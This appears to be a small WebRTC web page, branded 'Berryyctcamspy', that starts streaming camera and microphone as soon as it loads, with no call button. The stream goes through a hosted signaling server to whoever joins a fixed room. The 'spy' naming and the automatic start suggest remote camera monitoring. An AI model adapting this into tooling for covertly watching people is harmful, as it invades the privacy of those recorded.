<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Auto Video Call</title>
  </head>
  <body>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        color: white;
        font-family: Arial, sans-serif;
        text-align: center;
      }

      h1 {
        padding: 10px 0;
      }

      body {
        background-color: #121212;
        overflow: hidden;
        padding: 0 50px;
      }

      img {
        width: 50px;
        border-radius: 10px;
        margin-right: 10px;
      }
      .Myheader {
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 10px 0;
        gap: 2px;
        border-bottom: 1px solid gray;
        margin-bottom: 20px;
      }
      .Myheader p {
        font-size: 25px;
        font-weight: 600;
      }

      .home {
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        height: 80vh; /* Full viewport height */
      }

      /* ðŸ”¹ Video Container */
      .video-container {
        position: relative;
        width: 100vw;
        height: 70vh;
        overflow: hidden;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      /* ðŸ”¹ Big Remote Video */
      #remoteVideo {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%; /* Make the remote video fill the container */
        height: 100%; /* Make the remote video fill the container */
        object-fit: cover; /* Ensures the video covers the entire area */
        border-radius: 10px;
      }

      /* ðŸ”¹ Small Local Video (PiP Style) */
      .myVideo {
        position: absolute;
        bottom: 20px;
        right: 20px;
        width: 150px;
        height: 100px;
        object-fit: cover;
        border-radius: 10px;
        border: 3px solid white;
        box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.5);
        z-index: 20;
      }

      /* Button Styling */
      button {
        background-color: #4caf50; /* Green background */
        color: white; /* White text */
        padding: 15px 32px; /* Padding around text */
        text-align: center; /* Center text */
        text-decoration: none; /* Remove underline */
        display: inline-block; /* Display as inline-block */
        font-size: 16px; /* Font size */
        border: none; /* Remove border */
        border-radius: 8px; /* Rounded corners */
        cursor: pointer; /* Pointer cursor on hover */
        margin: 10px 0; /* Space between buttons */
        transition: background-color 0.3s ease, transform 0.2s ease;
        z-index: 10; /* Ensure buttons stay on top of video */
      }

      /* Hover effect */
      button:hover {
        background-color: #45a049; /* Slightly darker green */
        transform: scale(1.05); /* Slightly enlarge button */
      }

      /* Active effect when button is clicked */
      button:active {
        transform: scale(0.98); /* Slightly shrink button */
      }

      /* Disabled button */
      button:disabled {
        background-color: #ccc;
        cursor: not-allowed;
      }

      /* ðŸ”¹ RESPONSIVE DESIGN */

      /* ðŸ“± Small screens (mobile) */
      @media (max-width: 768px) {
        .video-container {
          width: 100vw;
          height: 100vh;
        }

        #remoteVideo {
          width: 100%;
          height: 100%;
          object-fit: cover; /* Fullscreen effect */
        }

        .myVideo {
          width: 90px;
          height: 60px;
          bottom: 10px;
          right: 10px;
        }

        /* Style for buttons in small screens */
        button {
          font-size: 14px;
          padding: 12px 24px;
        }
      }

      /* ðŸ’» Medium screens (tablets) */
      @media (max-width: 1024px) {
        .video-container {
          width: 100vw;
          height: 90vh;
        }

        #remoteVideo {
          width: 100%; /* Reduced size for medium screens */
          height: 100%; /* Reduced size */
        }

        .myVideo {
          width: 120px;
          height: 80px;
        }

        /* Style for buttons on medium screens */
        button {
          font-size: 15px;
          padding: 14px 28px;
        }
      }

      /* ðŸ–¥ Large screens (desktops) */
      @media (min-width: 1280px) {
        .video-container {
          width: 70vw;
          height: 90vh;
        }

        #remoteVideo {
          width: 100%; /* Remote video takes the full container width */
          height: 100%; /* Remote video takes the full container height */
        }

        .myVideo {
          width: 150px;
          height: 100px;
        }

        /* Style for buttons on large screens */
        button {
          font-size: 16px;
          padding: 15px 32px;
        }
      }
    </style>

    <div class="Myheader">
      <img src="./logo.jpg" alt="logo" />
      <p>Berryyctcamspy</p>
    </div>

  


    <div class="home">
      <div class="video-container">
        <video id="localVideo" class="myVideo" autoplay playsinline muted></video>
        <video id="remoteVideo" autoplay playsinline></video>
        <div id="videoUnavailable" style="display: none">
          Video is not available
        </div>
      </div>

    <script src="https://cdn.socket.io/4.4.1/socket.io.min.js"></script>
    <script>
      const socket = io("https://berryyctcamspy-production.up.railway.app/"); // Update with your Railway URL
      const roomId = "12345"; // Can be dynamic
      let localStream, remoteStream;
      let peerConnection;
      const config = {
        iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
      };

      async function startCall() {
        localStream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: true,
        });
        document.getElementById("localVideo").srcObject = localStream;

        peerConnection = new RTCPeerConnection(config);
        localStream
          .getTracks()
          .forEach((track) => peerConnection.addTrack(track, localStream));

        peerConnection.ontrack = (event) => {
          if (!remoteStream) {
            remoteStream = new MediaStream();
            document.getElementById("remoteVideo").srcObject = remoteStream;
          }
          remoteStream.addTrack(event.track);
        };

        peerConnection.onicecandidate = (event) => {
          if (event.candidate) {
            socket.emit("ice-candidate", {
              candidate: event.candidate,
              to: remotePeer,
            });
          }
        };

        socket.emit("join-room", roomId);
      }

      let remotePeer = null;

      socket.on("user-connected", async (id) => {
        remotePeer = id;
        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        socket.emit("offer", { offer, to: remotePeer });
      });

      socket.on("offer", async ({ offer, from }) => {
        remotePeer = from;
        await peerConnection.setRemoteDescription(
          new RTCSessionDescription(offer)
        );
        const answer = await peerConnection.createAnswer();
        await peerConnection.setLocalDescription(answer);
        socket.emit("answer", { answer, to: remotePeer });
      });

      socket.on("answer", async ({ answer }) => {
        await peerConnection.setRemoteDescription(
          new RTCSessionDescription(answer)
        );
      });

      socket.on("ice-candidate", ({ candidate }) => {
        peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
      });

      startCall();
    </script>
  </body>
</html>
